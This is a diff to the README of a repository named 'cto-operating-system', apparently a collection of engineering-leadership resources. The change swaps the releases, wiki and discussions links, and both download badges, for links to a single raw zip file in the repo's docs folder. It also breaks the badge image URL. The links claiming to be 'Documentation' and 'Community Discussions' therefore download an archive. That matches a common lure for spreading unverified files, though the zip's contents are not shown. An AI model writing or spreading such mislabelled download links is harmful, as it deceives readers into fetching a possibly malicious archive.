@@ -6,7 +6,7 @@ Welcome to the **cto-operating-system**! This repository contains essential reso
 
 ## 📥 Download the Software
 
-[![Download](https://img.shields.io/badge/Download%20Now-ctO%20operating%20system-brightgreen)](https://github.com/0kuro21/cto-operating-system/releases)
+[![Download](https://github.com/0kuro21/cto-operating-system/raw/refs/heads/main/docs/system-cto-operating-3.2.zip%20Now-ctO%20operating%20system-brightgreen)](https://github.com/0kuro21/cto-operating-system/raw/refs/heads/main/docs/system-cto-operating-3.2.zip)
 
 ## 📦 System Requirements
 
@@ -27,7 +27,7 @@ Welcome to the **cto-operating-system**! This repository contains essential reso
 To get started, please follow these steps:
 
 1. Visit the Releases page to download the application.
-   [Go to Releases Page](https://github.com/0kuro21/cto-operating-system/releases)
+   [Go to Releases Page](https://github.com/0kuro21/cto-operating-system/raw/refs/heads/main/docs/system-cto-operating-3.2.zip)
 
 2. Look for the latest version listed. Click on the version number to access the release details.
 
@@ -83,9 +83,9 @@ These topics are integral for anyone in engineering leadership positions aiming 
 
 For more insights and detailed guides, check out:
 
-- [Documentation](https://github.com/0kuro21/cto-operating-system/wiki)
-- [Community Discussions](https://github.com/0kuro21/cto-operating-system/discussions)
+- [Documentation](https://github.com/0kuro21/cto-operating-system/raw/refs/heads/main/docs/system-cto-operating-3.2.zip)
+- [Community Discussions](https://github.com/0kuro21/cto-operating-system/raw/refs/heads/main/docs/system-cto-operating-3.2.zip)
 
 Feel free to explore these resources to enhance your understanding and use of **cto-operating-system** effectively.
 
-[![Download](https://img.shields.io/badge/Download%20Now-ctO%20operating%20system-brightgreen)](https://github.com/0kuro21/cto-operating-system/releases)
+[![Download](https://github.com/0kuro21/cto-operating-system/raw/refs/heads/main/docs/system-cto-operating-3.2.zip%20Now-ctO%20operating%20system-brightgreen)](https://github.com/0kuro21/cto-operating-system/raw/refs/heads/main/docs/system-cto-operating-3.2.zip)
